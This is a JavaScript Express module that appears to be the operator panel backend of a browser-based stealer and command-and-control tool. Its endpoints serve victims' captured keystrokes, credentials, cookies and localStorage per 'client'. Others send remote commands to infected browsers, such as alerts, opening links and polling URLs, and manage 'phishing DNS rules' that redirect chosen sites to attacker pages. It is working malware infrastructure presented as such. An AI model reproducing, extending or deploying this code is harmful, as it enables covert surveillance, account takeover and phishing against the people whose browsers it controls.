const express = require("express");
const cors = require("cors");
const path = require("path");
const multer = require("multer");
const fs = require("fs");
const db = require("./db"); // Adjust the path as necessary
const { socketMaps, eventListener, config } = require("./sharedData");
const { Server } = require("socket.io");
// add jsdoc
/**
 *
 * @param {express.Express} appWebUI
 * @param {import("http").Server} server
 */
module.exports = function initializeWebUiApi(appWebUI, server) {
  const wakeUpTime = new Date();
  const serverOptions = config.DEVELOPMENT_MODE
    ? {
        cors: {
          origin: `http://localhost:${config.DEVELOPMENT_PORT}`,
        },
      }
    : {};
  const io = new Server(server, serverOptions);
  appWebUI.use(express.json());
  appWebUI.use(express.urlencoded({ extended: true }));
  appWebUI.use(express.static(path.join(__dirname, "../webui/dist")));
  if (config.DEVELOPMENT_MODE) {
    appWebUI.use(
      cors({
        origin: `http://localhost:${config.DEVELOPMENT_PORT}`, // allow only this origin
      })
    );
  }
  appWebUI.get("/statistics", (req, res) => {
    const stmt = db.prepare(
      `
      SELECT 
        (SELECT COUNT(*) FROM clients) as clients,
        (SELECT COUNT(*) FROM keylogs) as keylogs,
        (SELECT COUNT(*) FROM credentials) as credentials,
        (SELECT COUNT(*) FROM cookies) as cookies,
        (SELECT COUNT(*) FROM localstorage) as localstorage
    `
    );
    res.json({ wakeUpTime: wakeUpTime.getTime(), ...stmt.get() });
  });
  appWebUI.post("/alert", (req, res) => {
    const { client_id, message } = req.body;
    /**
     * @type {Socket}
     */
    const ws = socketMaps[client_id];
    if (ws) {
      ws.send(JSON.stringify(["alert", message]));
      res.json({ success: true });
    } else {
      res.status(404).json({ success: false, message: "Client not found" });
    }
  });
  appWebUI.post("/openlink", (req, res) => {
    const { client_id, url } = req.body;
    /**
     * @type {Socket}
     */
    const ws = socketMaps[client_id];
    if (ws) {
      ws.send(JSON.stringify(["openlink", url]));
      res.json({ success: true });
    } else {
      res.status(404).json({ success: false, message: "Client not found" });
    }
  });
  appWebUI.post("/startpolling", (req, res) => {
    const { client_id, url, interval } = req.body;
    /**
     * @type {Socket}
     */
    const ws = socketMaps[client_id];
    if (ws) {
      ws.send(JSON.stringify(["startpolling", url, interval]));
      res.json({ success: true });
    } else {
      res.status(404).json({ success: false, message: "Client not found" });
    }
  });
  appWebUI.post("/stoppolling", (req, res) => {
    const { client_id } = req.body;
    /**
     * @type {Socket}
     */
    const ws = socketMaps[client_id];
    if (ws) {
      ws.send(JSON.stringify(["stoppolling"]));
      res.json({ success: true });
    } else {
      res.status(404).json({ success: false, message: "Client not found" });
    }
  });
  appWebUI.get("/cookies/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT domain,path,name,value,expiration,secure,session,host_only,http_only FROM cookies WHERE client_id = ?
      `
    );

    const cookies = stmt.all(client_id);
    // convert experation from seconds since the UNIX epoch to Date string format (DD.MM.YYYY HH:MM)
    cookies.forEach((cookie) => {
      const date = new Date(cookie.expiration * 1000);
      cookie.expiration =
        date.getDate() +
        "." +
        (date.getMonth() + 1) +
        "." +
        date.getFullYear() +
        " " +
        date.getHours() +
        ":" +
        date.getMinutes();
      //remove last 5 characters from the expiration string
    });

    res.json(cookies);
  });
  appWebUI.get("/credentials/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT url,timestamp,data FROM credentials WHERE client_id = ?
      `
    );
    const credentials = stmt.all(client_id);
    res.json(credentials);
  });
  appWebUI.get("/keylogs/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT timestamp,keystrokes,url FROM keylogs WHERE client_id = ?
      `
    );
    const keylogs = stmt.all(client_id);
    res.json(keylogs);
  });
  appWebUI.get("/localstorage/:client_id", (req, res) => {
    const { client_id } = req.params;
    const stmt = db.prepare(
      `
      SELECT domain,key,value FROM localstorage WHERE client_id = ?
      `
    );
    const localstorage = stmt.all(client_id);
    res.json(localstorage);
  });
  appWebUI.get("/clients", (req, res) => {
    const stmt = db.prepare(`
      SELECT 
        c.*,
        (SELECT COUNT(*) FROM keylogs WHERE client_id = c.client_id) as keylogs,
        (SELECT COUNT(*) FROM credentials WHERE client_id = c.client_id) as credentials,
        (SELECT COUNT(*) FROM cookies WHERE client_id = c.client_id) as cookies,
        (SELECT COUNT(*) FROM localstorage WHERE client_id = c.client_id) as localstorage
      FROM clients c
    `);

    const statistics = stmt.all().map((client) => ({
      ...client,
      online: Object.keys(socketMaps).includes(client.client_id),
      isPolling: Object.keys(socketMaps).includes(client.client_id)
        ? socketMaps[client.client_id].isPolling
          ? true
          : false
        : false,
    }));

    res.json(statistics);
  });
  appWebUI.post("/phishingrules", async (req, res) => {
    const { client_ids } = req.body;

    try {
      const rules = db
        .prepare(
          `
        SELECT client_id, target_url, replacement_url 
        FROM phish_dns_rules 
        WHERE client_id IN (${client_ids.map(() => "?").join(",")})
      `
        )
        .all(client_ids);

      res.json({ success: true, rules });
    } catch (error) {
      console.error("Error getting phishing rules:", error);
      res
        .status(500)
        .json({ success: false, error: "Failed to get phishing rules" });
    }
  });
  appWebUI.post("/updatephishingrules", async (req, res) => {
    const { rules, client_id } = req.body;

    try {
      db.transaction(() => {
        // Delete existing rules for this client
        db.prepare("DELETE FROM phish_dns_rules WHERE client_id = ?").run(
          client_id
        );

        // Insert new rules
        const insertStmt = db.prepare(`
          INSERT INTO phish_dns_rules (client_id, target_url, replacement_url)
          VALUES (?, ?, ?)
        `);

        for (const rule of rules) {
          insertStmt.run(client_id, rule.target_url, rule.replacement_url);
        }
      })();

      // Notify client about the update
      const socket = socketMaps[client_id];
      if (socket) {
        const clientRules = rules.map((rule) => ({
          id: rule.id,
          target_url: rule.target_url,
          replacement_url: rule.replacement_url,
        }));
        socket.send(JSON.stringify(["phishdns_update", clientRules]));
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Error updating phishing rules:", error);
      res
        .status(500)
        .json({ success: false, error: "Failed to update phishing rules" });
    }
  });
  // Create uploads directory if it doesn't exist
  const uploadDir = path.join(__dirname, "uploaded_files");
  if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
  }

  // Configure multer for file uploads
  const storage = multer.diskStorage({
    destination: function (req, file, cb) {
      cb(null, uploadDir);
    },
    filename: function (req, file, cb) {
      cb(null, Date.now() + "-" + file.originalname);
    },
  });

  const upload = multer({ storage: storage });

  // Add file upload endpoint
  appWebUI.post("/api/upload", upload.single("file"), (req, res) => {
    if (!req.file) {
      return res.status(400).json({ error: "No file uploaded" });
    }
    res.json({
      success: true,
      filename: req.file.filename,
      path: req.file.path,
    });
  });

  // Add endpoint to list uploaded files
  appWebUI.get("/api/files", (req, res) => {
    fs.readdir(uploadDir, (err, files) => {
      if (err) {
        return res.status(500).json({ error: "Failed to list files" });
      }
      res.json(files);
    });
  });
  appWebUI.get("/*", (req, res) => {
    res.sendFile(path.join(__dirname, "../webui/dist", "index.html"));
  });
  io.on("connection", (socket) => {
    console.log("WebUI connected");
    socket.on("disconnect", () => {
      console.log("WebUI disconnected");
    });
  });
  eventListener.listener = (event, client_id) => {
    io.emit("event", { event, client_id });
  };
};
